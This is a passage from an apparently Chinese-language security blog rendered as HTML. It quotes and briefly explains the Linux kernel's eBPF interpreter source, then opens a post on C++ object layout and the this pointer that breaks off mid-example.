	bpf_prog_fill_jited_linfo(prog, addrs + <span class="number">1</span>);</span><br><span class="line">out_addrs:</span><br><span class="line">		kfree(addrs);</span><br><span class="line">		kfree(jit_data);</span><br><span class="line">		prog-&gt;aux-&gt;jit_data = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">if</span> (tmp_blinded)</span><br><span class="line">		bpf_jit_prog_release_other(prog, prog == orig_prog ?</span><br><span class="line">					   tmp : orig_prog);</span><br><span class="line">	<span class="keyword">return</span> prog;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当函数 <code>do_jit</code> 将 eBPF 码编译为字节码后，可以直接调用 <code>prog-&gt;bpf_func</code> 来执行字节码</p>
<p>当内核要执行 eBPF 字节码时，会调用原本位于 <code>prog-&gt;bpf_func</code> 的函数 <code>__bpf_prog_run</code>，该函数是 BPF 的核心函数入口，该函数被多个不同 stack size 的函数调用： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> u64 ___bpf_prog_run(u64 *regs, <span class="keyword">const</span> struct bpf_insn *insn, u64 *<span class="built_in">stack</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_INSN_2_LBL(x, y)    [BPF_##x | BPF_##y] = &amp;&amp;x##_##y</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_INSN_3_LBL(x, y, z) [BPF_##x | BPF_##y | BPF_##z] = &amp;&amp;x##_##y##_##z</span></span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">void</span> * <span class="keyword">const</span> jumptable[<span class="number">256</span>] __annotate_jump_table = &#123;</span><br><span class="line">		[<span class="number">0</span> ... <span class="number">255</span>] = &amp;&amp;default_label,</span><br><span class="line">		<span class="comment">/* Now overwrite non-defaults ... */</span></span><br><span class="line">		BPF_INSN_MAP(BPF_INSN_2_LBL, BPF_INSN_3_LBL),</span><br><span class="line">		<span class="comment">/* Non-UAPI available opcodes. */</span></span><br><span class="line">		[BPF_JMP | BPF_CALL_ARGS] = &amp;&amp;JMP_CALL_ARGS,</span><br><span class="line">		[BPF_JMP | BPF_TAIL_CALL] = &amp;&amp;JMP_TAIL_CALL,</span><br><span class="line">		[BPF_LDX | BPF_PROBE_MEM | BPF_B] = &amp;&amp;LDX_PROBE_MEM_B,</span><br><span class="line">		[BPF_LDX | BPF_PROBE_MEM | BPF_H] = &amp;&amp;LDX_PROBE_MEM_H,</span><br><span class="line">		[BPF_LDX | BPF_PROBE_MEM | BPF_W] = &amp;&amp;LDX_PROBE_MEM_W,</span><br><span class="line">		[BPF_LDX | BPF_PROBE_MEM | BPF_DW] = &amp;&amp;LDX_PROBE_MEM_DW,</span><br><span class="line">	&#125;; <span class="comment">/* 维护了一个跳表,根据opcode来进行跳转 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> BPF_INSN_3_LBL</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> BPF_INSN_2_LBL</span></span><br><span class="line">	u32 tail_call_cnt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONT	 (&#123; insn++; goto select_insn; &#125;)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONT_JMP (&#123; insn++; goto select_insn; &#125;)</span></span><br><span class="line"></span><br><span class="line">select_insn:</span><br><span class="line">	<span class="keyword">goto</span> *jumptable[insn-&gt;code];</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* ALU */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ALU(OPCODE, OP)			\</span></span><br><span class="line"><span class="meta">	ALU64_##OPCODE##_X:		\</span></span><br><span class="line"><span class="meta">		DST = DST OP SRC;	\</span></span><br><span class="line"><span class="meta">		CONT;			\</span></span><br><span class="line"><span class="meta">	ALU_##OPCODE##_X:		\</span></span><br><span class="line"><span class="meta">		DST = (u32) DST OP (u32) SRC;	\</span></span><br><span class="line"><span class="meta">		CONT;			\</span></span><br><span class="line"><span class="meta">	ALU64_##OPCODE##_K:		\</span></span><br><span class="line"><span class="meta">		DST = DST OP IMM;		\</span></span><br><span class="line"><span class="meta">		CONT;			\</span></span><br><span class="line"><span class="meta">	ALU_##OPCODE##_K:		\</span></span><br><span class="line"><span class="meta">		DST = (u32) DST OP (u32) IMM;	\</span></span><br><span class="line"><span class="meta">		CONT;</span></span><br><span class="line"></span><br><span class="line">	ALU(ADD,  +)</span><br><span class="line">	ALU(SUB,  -)</span><br><span class="line">	ALU(AND,  &amp;)</span><br><span class="line">	ALU(OR,   |)</span><br><span class="line">	ALU(LSH, &lt;&lt;)</span><br><span class="line">	ALU(RSH, &gt;&gt;)</span><br><span class="line">	ALU(XOR,  ^)</span><br><span class="line">	ALU(MUL,  *)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> ALU</span></span><br><span class="line">	ALU_NEG:</span><br><span class="line">		DST = (u32) -DST;</span><br><span class="line">		CONT;</span><br><span class="line">	ALU64_NEG:</span><br><span class="line">		DST = -DST;</span><br><span class="line">		CONT;</span><br><span class="line">	ALU_MOV_X:</span><br><span class="line">		DST = (u32) SRC;</span><br><span class="line">		CONT;</span><br><span class="line">	ALU_MOV_K:</span><br><span class="line">		DST = (u32) IMM;</span><br><span class="line">		CONT;</span><br><span class="line">	ALU64_MOV_X:</span><br><span class="line">		DST = SRC;</span><br><span class="line">		CONT;</span><br><span class="line">	ALU64_MOV_K:</span><br><span class="line">		DST = IMM;</span><br><span class="line">		CONT;</span><br><span class="line">	LD_IMM_DW:</span><br><span class="line">		DST = (u64) (u32) insn[<span class="number">0</span>].imm | ((u64) (u32) insn[<span class="number">1</span>].imm) &lt;&lt; <span class="number">32</span>;</span><br><span class="line">		insn++;</span><br><span class="line">		CONT;</span><br><span class="line">	ALU_ARSH_X:</span><br><span class="line">		DST = (u64) (u32) (((s32) DST) &gt;&gt; SRC);</span><br><span class="line">		CONT;</span><br><span class="line">	ALU_ARSH_K:</span><br><span class="line">		DST = (u64) (u32) (((s32) DST) &gt;&gt; IMM);</span><br><span class="line">		CONT;</span><br><span class="line">	ALU64_ARSH_X:</span><br><span class="line">		(*(s64 *) &amp;DST) &gt;&gt;= SRC;</span><br><span class="line">		CONT;</span><br><span class="line">	ALU64_ARSH_K:</span><br><span class="line">		(*(s64 *) &amp;DST) &gt;&gt;= IMM;</span><br><span class="line">		CONT;</span><br><span class="line">	ALU64_MOD_X:</span><br><span class="line">		div64_u64_rem(DST, SRC, &amp;AX);</span><br><span class="line">		DST = AX;</span><br><span class="line">		CONT;</span><br><span class="line">	ALU_MOD_X:</span><br><span class="line">		AX = (u32) DST;</span><br><span class="line">		DST = do_div(AX, (u32) SRC);</span><br><span class="line">		CONT;</span><br><span class="line">	ALU64_MOD_K:</span><br><span class="line">		div64_u64_rem(DST, IMM, &amp;AX);</span><br><span class="line">		DST = AX;</span><br><span class="line">		CONT;</span><br><span class="line">	ALU_MOD_K:</span><br><span class="line">		AX = (u32) DST;</span><br><span class="line">		DST = do_div(AX, (u32) IMM);</span><br><span class="line">		CONT;</span><br><span class="line">	ALU64_DIV_X:</span><br><span class="line">		DST = div64_u64(DST, SRC);</span><br><span class="line">		CONT;</span><br><span class="line">	ALU_DIV_X:</span><br><span class="line">		AX = (u32) DST;</span><br><span class="line">		do_div(AX, (u32) SRC);</span><br><span class="line">		DST = (u32) AX;</span><br><span class="line">		CONT;</span><br><span class="line">	ALU64_DIV_K:</span><br><span class="line">		DST = div64_u64(DST, IMM);</span><br><span class="line">		CONT;</span><br><span class="line">	ALU_DIV_K:</span><br><span class="line">		AX = (u32) DST;</span><br><span class="line">		do_div(AX, (u32) IMM);</span><br><span class="line">		DST = (u32) AX;</span><br><span class="line">		CONT;</span><br><span class="line">	ALU_END_TO_BE:</span><br><span class="line">		<span class="keyword">switch</span> (IMM) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">			DST = (__force u16) cpu_to_be16(DST);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">32</span>:</span><br><span class="line">			DST = (__force u32) cpu_to_be32(DST);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">64</span>:</span><br><span class="line">			DST = (__force u64) cpu_to_be64(DST);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		CONT;</span><br><span class="line">	ALU_END_TO_LE:</span><br><span class="line">		<span class="keyword">switch</span> (IMM) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">			DST = (__force u16) cpu_to_le16(DST);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">32</span>:</span><br><span class="line">			DST = (__force u32) cpu_to_le32(DST);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">64</span>:</span><br><span class="line">			DST = (__force u64) cpu_to_le64(DST);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		CONT;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* CALL */</span></span><br><span class="line">	JMP_CALL:</span><br><span class="line">		<span class="comment">/* Function call scratches BPF_R1-BPF_R5 registers,</span></span><br><span class="line"><span class="comment">		 * preserves BPF_R6-BPF_R9, and stores return value</span></span><br><span class="line"><span class="comment">		 * into BPF_R0.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		BPF_R0 = (__bpf_call_base + insn-&gt;imm)(BPF_R1, BPF_R2, BPF_R3,</span><br><span class="line">						       BPF_R4, BPF_R5);</span><br><span class="line">		CONT;</span><br><span class="line"></span><br><span class="line">	JMP_CALL_ARGS:</span><br><span class="line">		BPF_R0 = (__bpf_call_base_args + insn-&gt;imm)(BPF_R1, BPF_R2,</span><br><span class="line">							    BPF_R3, BPF_R4,</span><br><span class="line">							    BPF_R5,</span><br><span class="line">							    insn + insn-&gt;off + <span class="number">1</span>);</span><br><span class="line">		CONT;</span><br><span class="line"></span><br><span class="line">	JMP_TAIL_CALL: &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span> =</span> (struct bpf_map *) (<span class="keyword">unsigned</span> <span class="keyword">long</span>) BPF_R2;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">bpf_array</span> *<span class="title">array</span> =</span> container_of(<span class="built_in">map</span>, struct bpf_array, <span class="built_in">map</span>);</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">bpf_prog</span> *<span class="title">prog</span>;</span></span><br><span class="line">		u32 index = BPF_R3;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (unlikely(index &gt;= <span class="built_in">array</span>-&gt;<span class="built_in">map</span>.max_entries))</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">		<span class="keyword">if</span> (unlikely(tail_call_cnt &gt; MAX_TAIL_CALL_CNT))</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">		tail_call_cnt++;</span><br><span class="line"></span><br><span class="line">		prog = READ_ONCE(<span class="built_in">array</span>-&gt;ptrs[index]);</span><br><span class="line">		<span class="keyword">if</span> (!prog)</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* ARG1 at this point is guaranteed to point to CTX from</span></span><br><span class="line"><span class="comment">		 * the verifier side due to the fact that the tail call is</span></span><br><span class="line"><span class="comment">		 * handled like a helper, that is, bpf_tail_call_proto,</span></span><br><span class="line"><span class="comment">		 * where arg1_type is ARG_PTR_TO_CTX.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		insn = prog-&gt;insnsi;</span><br><span class="line">		<span class="keyword">goto</span> select_insn;</span><br><span class="line">out:</span><br><span class="line">		CONT;</span><br><span class="line">	&#125;</span><br><span class="line">	JMP_JA:</span><br><span class="line">		insn += insn-&gt;off;</span><br><span class="line">		CONT;</span><br><span class="line">	JMP_EXIT:</span><br><span class="line">		<span class="keyword">return</span> BPF_R0;</span><br><span class="line">	<span class="comment">/* JMP */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COND_JMP(SIGN, OPCODE, CMP_OP)				\</span></span><br><span class="line"><span class="meta">	JMP_##OPCODE##_X:					\</span></span><br><span class="line"><span class="meta">		<span class="meta-keyword">if</span> ((SIGN##64) DST CMP_OP (SIGN##64) SRC) &#123;	\</span></span><br><span class="line"><span class="meta">			insn += insn-&gt;off;			\</span></span><br><span class="line"><span class="meta">			CONT_JMP;				\</span></span><br><span class="line"><span class="meta">		&#125;						\</span></span><br><span class="line"><span class="meta">		CONT;						\</span></span><br><span class="line"><span class="meta">	JMP32_##OPCODE##_X:					\</span></span><br><span class="line"><span class="meta">		<span class="meta-keyword">if</span> ((SIGN##32) DST CMP_OP (SIGN##32) SRC) &#123;	\</span></span><br><span class="line"><span class="meta">			insn += insn-&gt;off;			\</span></span><br><span class="line"><span class="meta">			CONT_JMP;				\</span></span><br><span class="line"><span class="meta">		&#125;						\</span></span><br><span class="line"><span class="meta">		CONT;						\</span></span><br><span class="line"><span class="meta">	JMP_##OPCODE##_K:					\</span></span><br><span class="line"><span class="meta">		<span class="meta-keyword">if</span> ((SIGN##64) DST CMP_OP (SIGN##64) IMM) &#123;	\</span></span><br><span class="line"><span class="meta">			insn += insn-&gt;off;			\</span></span><br><span class="line"><span class="meta">			CONT_JMP;				\</span></span><br><span class="line"><span class="meta">		&#125;						\</span></span><br><span class="line"><span class="meta">		CONT;						\</span></span><br><span class="line"><span class="meta">	JMP32_##OPCODE##_K:					\</span></span><br><span class="line"><span class="meta">		<span class="meta-keyword">if</span> ((SIGN##32) DST CMP_OP (SIGN##32) IMM) &#123;	\</span></span><br><span class="line"><span class="meta">			insn += insn-&gt;off;			\</span></span><br><span class="line"><span class="meta">			CONT_JMP;				\</span></span><br><span class="line"><span class="meta">		&#125;						\</span></span><br><span class="line"><span class="meta">		CONT;</span></span><br><span class="line">	COND_JMP(u, JEQ, ==)</span><br><span class="line">	COND_JMP(u, JNE, !=)</span><br><span class="line">	COND_JMP(u, JGT, &gt;)</span><br><span class="line">	COND_JMP(u, JLT, &lt;)</span><br><span class="line">	COND_JMP(u, JGE, &gt;=)</span><br><span class="line">	COND_JMP(u, JLE, &lt;=)</span><br><span class="line">	COND_JMP(u, JSET, &amp;)</span><br><span class="line">	COND_JMP(s, JSGT, &gt;)</span><br><span class="line">	COND_JMP(s, JSLT, &lt;)</span><br><span class="line">	COND_JMP(s, JSGE, &gt;=)</span><br><span class="line">	COND_JMP(s, JSLE, &lt;=)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> COND_JMP</span></span><br><span class="line">	<span class="comment">/* STX and ST and LDX*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LDST(SIZEOP, SIZE)						\</span></span><br><span class="line"><span class="meta">	STX_MEM_##SIZEOP:						\</span></span><br><span class="line"><span class="meta">		*(SIZE *)(unsigned long) (DST + insn-&gt;off) = SRC;	\</span></span><br><span class="line"><span class="meta">		CONT;							\</span></span><br><span class="line"><span class="meta">	ST_MEM_##SIZEOP:						\</span></span><br><span class="line"><span class="meta">		*(SIZE *)(unsigned long) (DST + insn-&gt;off) = IMM;	\</span></span><br><span class="line"><span class="meta">		CONT;							\</span></span><br><span class="line"><span class="meta">	LDX_MEM_##SIZEOP:						\</span></span><br><span class="line"><span class="meta">		DST = *(SIZE *)(unsigned long) (SRC + insn-&gt;off);	\</span></span><br><span class="line"><span class="meta">		CONT;</span></span><br><span class="line"></span><br><span class="line">	LDST(B,   u8)</span><br><span class="line">	LDST(H,  u16)</span><br><span class="line">	LDST(W,  u32)</span><br><span class="line">	LDST(DW, u64)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> LDST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LDX_PROBE(SIZEOP, SIZE)							\</span></span><br><span class="line"><span class="meta">	LDX_PROBE_MEM_##SIZEOP:							\</span></span><br><span class="line"><span class="meta">		bpf_probe_read_kernel(&amp;DST, SIZE, (const void *)(long) (SRC + insn-&gt;off));	\</span></span><br><span class="line"><span class="meta">		CONT;</span></span><br><span class="line">	LDX_PROBE(B,  <span class="number">1</span>)</span><br><span class="line">	LDX_PROBE(H,  <span class="number">2</span>)</span><br><span class="line">	LDX_PROBE(W,  <span class="number">4</span>)</span><br><span class="line">	LDX_PROBE(DW, <span class="number">8</span>)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> LDX_PROBE</span></span><br><span class="line"></span><br><span class="line">	STX_XADD_W: <span class="comment">/* lock xadd *(u32 *)(dst_reg + off16) += src_reg */</span></span><br><span class="line">		atomic_add((u32) SRC, (<span class="keyword">atomic_t</span> *)(<span class="keyword">unsigned</span> <span class="keyword">long</span>)</span><br><span class="line">			   (DST + insn-&gt;off));</span><br><span class="line">		CONT;</span><br><span class="line">	STX_XADD_DW: <span class="comment">/* lock xadd *(u64 *)(dst_reg + off16) += src_reg */</span></span><br><span class="line">		atomic64_add((u64) SRC, (<span class="keyword">atomic64_t</span> *)(<span class="keyword">unsigned</span> <span class="keyword">long</span>)</span><br><span class="line">			     (DST + insn-&gt;off));</span><br><span class="line">		CONT;</span><br><span class="line"></span><br><span class="line">	default_label:</span><br><span class="line">		<span class="comment">/* If we ever reach this, we have a bug somewhere. Die hard here</span></span><br><span class="line"><span class="comment">		 * instead of just returning 0; we could be somewhere in a subprog,</span></span><br><span class="line"><span class="comment">		 * so execution could continue otherwise which we do /not/ want.</span></span><br><span class="line"><span class="comment">		 *</span></span><br><span class="line"><span class="comment">		 * Note, verifier whitelists all opcodes in bpf_opcode_in_insntable().</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		pr_warn(<span class="string">&quot;BPF interpreter: unknown opcode %02x\n&quot;</span>, insn-&gt;code);</span><br><span class="line">		BUG_ON(<span class="number">1</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/20/Cpp%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86+%E5%BA%95%E5%B1%82%E9%80%86%E5%90%91/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/20/Cpp%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86+%E5%BA%95%E5%B1%82%E9%80%86%E5%90%91/" class="post-title-link" itemprop="url">Cpp基础知识+底层逆向</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-11-20 12:46:37 / Modified: 16:09:14" itemprop="dateCreated datePublished" datetime="2023-11-20T12:46:37+08:00">2023-11-20</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>39k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>35 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="cpp-对象"><a href="#cpp-对象" class="headerlink" title="cpp 对象"></a>cpp 对象</h2><p>C++ 的每一个成员函数在 class 中声明，但是却不出现在每个对象中：</p>
<ul>
<li>每一个非内联的成员函数，只会诞生一个函数实例</li>
<li>每个内联函数，会在其每一个使用者身上产生一个函数实例</li>
</ul>
<p>C++ 的类就相当于一个数据结构体加上多个函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class = data structure + code (methods)</span><br></pre></td></tr></table></figure>
<h2 id="This-指针"><a href="#This-指针" class="headerlink" title="This 指针"></a>This 指针</h2><p>This 指针就是指向实例对象自己的指针</p>
<p>案例一：This 的使用</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;name&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> :</span> <span class="keyword">public</span> Base&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(<span class="keyword">this</span>-&gt;name,<span class="string">&quot;A&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>-&gt;<span class="built_in">fun</span>(); <span class="comment">// 相当于fun</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> :</span> <span class="keyword">public</span> Base&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">foo</span><span 